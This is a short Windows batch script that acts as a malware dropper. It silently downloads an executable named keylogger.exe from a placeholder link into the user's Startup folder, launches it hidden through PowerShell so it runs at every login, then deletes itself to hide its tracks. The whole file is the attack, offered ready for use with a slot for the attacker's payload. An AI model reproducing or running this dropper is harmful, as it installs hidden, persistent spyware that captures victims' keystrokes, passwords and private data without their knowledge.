@echo off

set "OutputFile=%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\keylogger.exe"

powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'LINK_TO_DOWNLOAD_YOUR_EXE_FILE' -OutFile '%OutputFile%'"

powershell -Command "Start-Process -WindowStyle Hidden -FilePath '%OutputFile%'"

del "%~f0"
